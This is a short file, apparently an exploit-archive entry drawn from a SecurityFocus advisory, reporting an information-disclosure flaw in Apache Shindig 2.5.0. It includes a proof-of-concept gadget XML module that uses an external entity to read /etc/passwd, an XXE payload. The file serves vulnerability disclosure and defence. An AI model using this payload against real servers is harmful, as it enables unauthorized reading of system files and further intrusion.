@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/63260/info
+
+Apache Shindig is prone to an information-disclosure vulnerability.
+
+An attacker can exploit this issue to gain access to sensitive information; this may lead to further attacks.
+
+Apache Shindig 2.5.0 is vulnerable. 
+
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE Module [ <!ENTITY passwd SYSTEM "file:///etc/passwd"> ]> <Module> 
+<ModulePrefs title="Test Application"> <Require feature="opensocial-0.9" /> 
+</ModulePrefs> <Content type="html"> &passwd; hello </Content> </Module>
+
